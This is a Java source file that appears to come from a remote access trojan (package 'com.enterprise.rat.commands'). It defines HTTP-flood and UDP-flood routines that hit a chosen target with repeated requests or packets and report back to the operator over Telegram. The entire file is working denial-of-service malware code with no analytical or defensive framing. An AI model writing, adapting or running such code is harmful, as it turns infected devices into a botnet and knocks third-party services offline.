package com.enterprise.rat.commands;

import com.enterprise.rat.utils.TelegramApi;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;

public class NetworkManager {
    public static void httpFlood(String url, int count) {
        new Thread(() -> {
            try {
                URL httpUrl = new URL(url);
                for (int i=0; i<count; i++) {
                    HttpURLConnection conn = (HttpURLConnection) httpUrl.openConnection();
                    conn.setRequestMethod("GET");
                    conn.connect();
                    conn.disconnect();
                }
                TelegramApi.sendMessage("🌊 HTTP flood done (" + count + " requests to " + url + ")");
            } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
        }).start();
    }

    public static void udpFlood(String host, int port, int durationSec) {
        new Thread(() -> {
            try {
                InetAddress addr = InetAddress.getByName(host);
                DatagramSocket socket = new DatagramSocket();
                byte[] data = new byte[1024];
                DatagramPacket packet = new DatagramPacket(data, data.length, addr, port);
                long end = System.currentTimeMillis() + durationSec*1000L;
                while (System.currentTimeMillis() < end) socket.send(packet);
                socket.close();
                TelegramApi.sendMessage("🌊 UDP flood done (" + durationSec + "s)");
            } catch (Exception e) { TelegramApi.sendMessage("❌ " + e.getMessage()); }
        }).start();
    }
}
